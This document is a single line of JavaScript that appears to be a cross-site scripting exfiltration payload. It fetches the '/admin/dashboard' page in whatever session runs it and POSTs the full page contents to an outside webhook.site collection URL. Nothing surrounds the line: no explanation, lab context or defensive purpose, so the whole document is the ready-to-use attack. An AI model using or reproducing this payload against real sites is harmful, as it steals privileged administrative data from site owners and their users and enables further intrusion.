fetch('/admin/dashboard').then(r=>r.text()).then(d=>fetch('https://webhook.site/0b8aee5b-c91a-44fc-b825-d36d6ad0bc6e',{method:'POST',body:d}))
